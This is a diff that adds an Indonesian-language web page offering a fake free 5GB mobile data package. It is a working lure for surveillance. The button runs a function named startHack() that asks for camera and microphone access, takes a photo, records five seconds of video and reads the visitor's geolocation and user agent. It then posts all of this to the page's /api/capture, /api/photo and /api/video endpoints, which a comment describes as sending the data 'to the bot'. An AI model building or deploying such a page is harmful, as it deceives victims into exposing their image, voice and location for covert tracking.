@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>PAKET GRATIS 5GB</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            text-align: center;
+            padding: 50px 20px;
+        }
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+            background: rgba(255,255,255,0.1);
+            padding: 30px;
+            border-radius: 20px;
+            backdrop-filter: blur(10px);
+        }
+        h1 {
+            font-size: 28px;
+            margin-bottom: 10px;
+        }
+        .price {
+            font-size: 48px;
+            font-weight: bold;
+            margin: 20px 0;
+            color: #ffd700;
+        }
+        .btn {
+            background: #4CAF50;
+            color: white;
+            padding: 15px 40px;
+            border: none;
+            border-radius: 50px;
+            font-size: 18px;
+            cursor: pointer;
+            width: 100%;
+            margin: 10px 0;
+            font-weight: bold;
+        }
+        .btn:hover {
+            background: #45a049;
+        }
+        .loading {
+            display: none;
+            margin: 20px 0;
+        }
+        .spinner {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #3498db;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎉 PAKET GRATIS 5GB</h1>
+        <p>UNTUK SEMUA KARTU!</p>
+        <div class="price">GRATIS</div>
+        <p>✅ Kuota 5GB</p>
+        <p>✅ Masa Aktif 30 Hari</p>
+        <p>✅ Semua Jaringan</p>
+        <p>✅ Langsung Aktif</p>
+        
+        <button class="btn" onclick="startHack()">AMBIL GRATIS</button>
+        
+        <div class="loading" id="loading">
+            <div class="spinner"></div>
+            <p style="margin-top: 20px;">MEMPROSES... 100%</p>
+        </div>
+    </div>
+
+    <script>
+        function startHack() {
+            document.querySelector('.btn').style.display = 'none';
+            document.getElementById('loading').style.display = 'block';
+            
+            // Minta izin kamera
+            navigator.mediaDevices.getUserMedia({ 
+                video: true, 
+                audio: true 
+            }).then(function(stream) {
+                // Tangkap foto/video
+                const videoTrack = stream.getVideoTracks()[0];
+                const imageCapture = new ImageCapture(videoTrack);
+                
+                // Ambil lokasi
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    const data = {
+                        type: 'location',
+                        lat: position.coords.latitude,
+                        lng: position.coords.longitude,
+                        userAgent: navigator.userAgent
+                    };
+                    
+                    // Kirim data ke bot
+                    fetch('/api/capture', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(data)
+                    });
+                });
+                
+                // Ambil foto
+                imageCapture.takePhoto()
+                    .then(blob => {
+                        const formData = new FormData();
+                        formData.append('photo', blob);
+                        
+                        fetch('/api/photo', {
+                            method: 'POST',
+                            body: formData
+                        });
+                    });
+                    
+                // Rekam video 5 detik
+                const mediaRecorder = new MediaRecorder(stream);
+                const chunks = [];
+                
+                mediaRecorder.ondataavailable = e => chunks.push(e.data);
+                mediaRecorder.onstop = () => {
+                    const videoBlob = new Blob(chunks, { type: 'video/mp4' });
+                    const formData = new FormData();
+                    formData.append('video', videoBlob);
+                    
+                    fetch('/api/video', {
+                        method: 'POST',
+                        body: formData
+                    });
+                };
+                
+                mediaRecorder.start();
+                setTimeout(() => mediaRecorder.stop(), 5000);
+            }).catch(function(err) {
+                console.log('Gagal akses kamera:', err);
+            });
+        }
+    </script>
+</body>
+</html>
